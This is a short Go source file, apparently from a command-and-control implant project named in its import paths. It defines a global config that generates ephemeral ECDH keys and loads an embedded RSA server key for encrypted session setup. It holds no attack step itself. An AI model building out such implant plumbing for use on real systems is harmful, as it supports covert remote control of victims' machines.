package global

import (
	"crypto/rsa"
	"github.com/lzkking/harle/implant/pkg/crypto/ecdh"
	mrsa "github.com/lzkking/harle/implant/pkg/crypto/rsa"
)

type Global struct {
	RsaPublicKey    *rsa.PublicKey
	ServerPublicKey []byte
	PrivateKey      []byte
	PublicKey       []byte
	KeySend         []byte
	KeyRecv         []byte
	SessionId       string
}

var (
	GlobalConfig Global
)

func Init() error {
	publicKey, privateKey, err := ecdh.GetTmpKey()
	if err != nil {
		return err
	}
	GlobalConfig.PrivateKey = privateKey
	GlobalConfig.PublicKey = publicKey

	rsaPublicKey, err := mrsa.LoadRsaPublicKey()
	if err != nil {
		return err
	}
	GlobalConfig.RsaPublicKey = rsaPublicKey
	return nil
}
